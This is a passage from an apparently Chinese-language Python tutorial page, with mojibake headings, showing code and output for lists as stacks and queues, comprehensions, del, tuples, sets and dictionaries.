punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token comment"># [999, 55, 44, 5, 2, 1, 1]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># [999, 55, 44, 5, 2, 1, 1]</span><span class="token triple-quoted-string string">'''[1, 2, 1, 5][1, 2, 1, 5, 999][1, 2, 1, 5, 999, 44, 55][1, 2, 'hhhh', 1, 5, 999, 44, 55][1, 2, 1, 5, 999, 44, 55]55[44][]12[1, 1, 2, 5, 44, 55, 999][999, 55, 44, 5, 2, 1, 1][999, 55, 44, 5, 2, 1, 1]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨"><a href="#å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨" class="headerlink" title="å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨"></a>å°†åˆ—è¡¨å½“åšå †æ ˆä½¿ç”¨</h4><p>æœ€å…ˆè¿›å…¥çš„å…ƒç´ æœ€åä¸€ä¸ªè¢«é‡Šæ”¾ï¼ˆåè¿›å…ˆå‡ºï¼‰ã€‚ç”¨ append() æ–¹æ³•å¯ä»¥æŠŠä¸€ä¸ªå…ƒç´ æ·»åŠ åˆ°å †æ ˆé¡¶ã€‚ç”¨ä¸æŒ‡å®šç´¢å¼•çš„ pop() æ–¹æ³•å¯ä»¥æŠŠä¸€ä¸ªå…ƒç´ ä»å †æ ˆé¡¶é‡Šæ”¾å‡ºæ¥ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">stack <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">)</span>stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">55</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 3, 'test', '999'][1, 3, 'test', '999', 33, 44, 55]5544[1, 3, 'test', '999', 33]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨"><a href="#å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨" class="headerlink" title="å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨"></a>å°†åˆ—è¡¨å½“ä½œé˜Ÿåˆ—ä½¿ç”¨</h4><p>é˜Ÿåˆ—é‡Œç¬¬ä¸€åŠ å…¥çš„å…ƒç´ ï¼Œç¬¬ä¸€ä¸ªå–å‡ºæ¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> collections <span class="token keyword">import</span> dequequeue <span class="token operator">=</span> deque<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'999'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'hhh'</span><span class="token punctuation">)</span>queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 3, 'test', '999', 33]deque([1, 2, 'test', '999', 'hhh', 'aaaa'])12deque(['test', '999', 'hhh', 'aaaa'])'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ—è¡¨æ¨å¯¼å¼"><a href="#åˆ—è¡¨æ¨å¯¼å¼" class="headerlink" title="åˆ—è¡¨æ¨å¯¼å¼"></a>åˆ—è¡¨æ¨å¯¼å¼</h4><p>åˆ—è¡¨æ¨å¯¼å¼æä¾›äº†ä»åºåˆ—åˆ›å»ºåˆ—è¡¨çš„ç®€å•é€”å¾„ã€‚åº”ç”¨ç¨‹åºå°†ä¸€äº›æ“ä½œåº”ç”¨äºæŸä¸ªåºåˆ—çš„æ¯ä¸ªå…ƒç´ ï¼Œç”¨å…¶è·å¾—çš„ç»“æœä½œä¸ºç”Ÿæˆæ–°åˆ—è¡¨çš„å…ƒç´ ï¼Œæˆ–è€…æ ¹æ®ç¡®å®šçš„åˆ¤å®šæ¡ä»¶åˆ›å»ºå­åºåˆ—ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>vvar <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> x <span class="token keyword">for</span> x <span class="token keyword">in</span> var<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>vvar<span class="token punctuation">)</span>vvaar <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> x<span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> var<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>vvaar<span class="token punctuation">)</span>var1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' dcc'</span><span class="token punctuation">,</span> <span class="token string">'   ssss'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> var1<span class="token punctuation">]</span><span class="token punctuation">)</span>var2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>var3 <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token operator">*</span> y <span class="token keyword">for</span> x <span class="token keyword">in</span> var <span class="token keyword">for</span> y <span class="token keyword">in</span> var2<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span>var<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> var2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span><span class="token number">355</span><span class="token operator">/</span><span class="token number">113</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[1, 2, 4, 8][2, 4, 8, 16][[1, 2], [2, 4], [4, 8], [8, 16]]['dcc', 'ssss'][2, 3, 4, 4, 4, 6, 8, 8, 8, 12, 16, 16, 16, 24, 32, 32][2, 6, 16, 32]['3.1', '3.14', '3.142', '3.1416', '3.14159']'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åµŒå¥—åˆ—è¡¨è§£æ"><a href="#åµŒå¥—åˆ—è¡¨è§£æ" class="headerlink" title="åµŒå¥—åˆ—è¡¨è§£æ"></a>åµŒå¥—åˆ—è¡¨è§£æ</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">matrix <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>matrix<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span>row<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> matrix<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 3*4è½¬ä¸º4*3</span>matrix <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>transposed <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    transposed<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>row<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> matrix<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>transposed<span class="token punctuation">)</span>matrix <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span>transposed <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># the following 3 lines implement the nested listcomp</span>    transposed_row <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> matrix<span class="token punctuation">:</span>        transposed_row<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>transposed<span class="token punctuation">.</span>append<span class="token punctuation">(</span>transposed_row<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>transposed<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''[[1, 2, 3, 4], [2, 3, 4, 5], [3, 4, 5, 6]][[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]][[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]][[1, 2, 3], [2, 3, 4], [3, 4, 5], [4, 5, 6]]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="delè¯­å¥"><a href="#delè¯­å¥" class="headerlink" title="delè¯­å¥"></a>delè¯­å¥</h4><p>ä½¿ç”¨ del è¯­å¥å¯ä»¥ä»ä¸€ä¸ªåˆ—è¡¨ä¸­ä¾ç´¢å¼•è€Œä¸æ˜¯å€¼æ¥åˆ é™¤ä¸€ä¸ªå…ƒç´ ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">var <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token keyword">del</span> var<span class="token triple-quoted-string string">'''[1, 23, 3, 6, 'test'][1, 23, 6, 'test'][23, 'test'][]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å…ƒç»„å’Œåºåˆ—"><a href="#å…ƒç»„å’Œåºåˆ—" class="headerlink" title="å…ƒç»„å’Œåºåˆ—"></a>å…ƒç»„å’Œåºåˆ—</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">tuple</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">tuple</span><span class="token punctuation">)</span>tuple2 <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'hhhh'</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>tuple2<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''(1, 2, 3, 4, 5)((1, 2, 3, 4, 5), ('test', 'hhhh', 'aaaa'))'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é›†åˆ-1"><a href="#é›†åˆ-1" class="headerlink" title="é›†åˆ"></a>é›†åˆ</h3><p>åŠŸèƒ½åŒ…æ‹¬å…³ç³»æµ‹è¯•å’Œæ¶ˆé™¤é‡å¤å…ƒç´ </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">basket <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'apple'</span><span class="token punctuation">,</span> <span class="token string">'pear'</span><span class="token punctuation">,</span> <span class="token string">'orange'</span><span class="token punctuation">,</span> <span class="token string">'banana'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>basket<span class="token punctuation">)</span>                      <span class="token comment"># åˆ é™¤é‡å¤çš„</span><span class="token comment"># {'banana', 'orange', 'apple', 'pear'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'orange'</span> <span class="token keyword">in</span> basket<span class="token punctuation">)</span>                 <span class="token comment"># æ£€æµ‹æˆå‘˜</span><span class="token comment"># True</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'crabgrass'</span> <span class="token keyword">in</span> basket<span class="token punctuation">)</span><span class="token comment"># False</span><span class="token comment"># ä»¥ä¸‹æ¼”ç¤ºäº†ä¸¤ä¸ªé›†åˆçš„æ“ä½œ</span>a <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>                      <span class="token comment"># a ä¸­å”¯ä¸€çš„å­—æ¯</span><span class="token comment"># {'c', 'r', 'b', 'a', 'd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>                  <span class="token comment"># åœ¨ a ä¸­çš„å­—æ¯ï¼Œä½†ä¸åœ¨ b ä¸­</span><span class="token comment"># {'r', 'b', 'd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>                  <span class="token comment"># åœ¨ a æˆ– b ä¸­çš„å­—æ¯</span><span class="token comment"># {'c', 'r', 'l', 'm', 'z', 'b', 'a', 'd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>                  <span class="token comment"># åœ¨ a å’Œ b ä¸­éƒ½æœ‰çš„å­—æ¯</span><span class="token comment"># {'c', 'a'}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>                  <span class="token comment"># åœ¨ a æˆ– b ä¸­çš„å­—æ¯ï¼Œä½†ä¸åŒæ—¶åœ¨ a å’Œ b ä¸­</span><span class="token comment"># {'m', 'z', 'r', 'b', 'l', 'd'}</span>a <span class="token operator">=</span> <span class="token punctuation">{</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'abracadabra'</span> <span class="token keyword">if</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token string">'abc'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment"># {'d', 'r'}</span><span class="token triple-quoted-string string">'''{'banana', 'orange', 'apple', 'pear'}TrueFalse{'c', 'r', 'b', 'a', 'd'}{'r', 'b', 'd'}{'c', 'r', 'l', 'm', 'z', 'b', 'a', 'd'}{'c', 'a'}{'m', 'z', 'r', 'b', 'l', 'd'}{'d', 'r'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å­—å…¸-1"><a href="#å­—å…¸-1" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'sape'</span><span class="token punctuation">,</span> <span class="token number">4139</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'guido'</span><span class="token punctuation">,</span> <span class="token number">4127</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'jack'</span><span class="token punctuation">,</span> <span class="token number">4098</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># {'sape': 4139, 'guido': 4127, 'jack': 4098}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment"># ç©ºå­—å…¸</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {}</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 1}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">'dddd'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1, 1: 'dddd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡º2,testçš„å€¼</span><span class="token comment"># test 1</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰é”®å</span><span class="token comment"># dict_keys(['test', 1])</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># è¾“å‡ºæ‰€æœ‰é”®å€¼</span><span class="token comment"># dict_values([1, 'dddd'])</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'txt'</span>  <span class="token comment"># ä¿®æ”¹é”®å€¼</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 'txt'}</span><span class="token keyword">del</span> dict2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># åˆ é™¤ä¸€ä¸ªé”®</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1}</span>dict2<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># æ¸…ç©ºå­—å…¸</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {}</span><span class="token keyword">del</span> dict2  <span class="token comment"># åˆ é™¤å­—å…¸</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'var'</span><span class="token punctuation">}</span><span class="token comment"># é‡å¤æ—¶åè€…è¦†ç›–å‰è€…</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'1': 2, 'var': 'var', 'test': 'test'}</span><span class="token triple-quoted-string string">'''{'sape': 4139, 'guido': 4127, 'jack': 4098}{}{2: 'test', 'test': 1}{'test': 1, 1: 'dddd'}test 1dict_keys(['test', 1])dict_values([1, 'dddd']){2: 'test', 'test': 'txt'}{'test': 1}{}{'1': 2, 'var': 'var', 'test': 'test'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœå…³é”®å­—åªæ˜¯ç®€å•çš„å­—ç¬¦ä¸²ï¼Œä½¿ç”¨å…³é”®å­—å‚æ•°æŒ‡å®šé”®å€¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span><span class="token punctuation">(</span>sape<span class="token operator">=</span><span class="token number">4139</span><span class="token punctuation">,</span> guido<span class="token operator">=</span><span class="token number">4127</span><span class="token punctuation">,</span> jack<span class="token operator">=</span><span class="token number">4098</span><span class="token punctuation">)</span><span class="token comment">#{'sape': 4139, 'jack': 4098, 'guido': 4127}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å­—å…¸æ¨å¯¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dict3 <span class="token operator">=</span> <span class="token punctuation">{</span>x<span class="token punctuation">:</span> x<span class="token operator">**</span><span class="token number">2</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict3<span class="token punctuation">)</span><span class="token comment"># {2: 4, 4: 16, 6: 36}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="éå†æŠ€å·§"><a href="#éå†æŠ€å·§" class="headerlink" 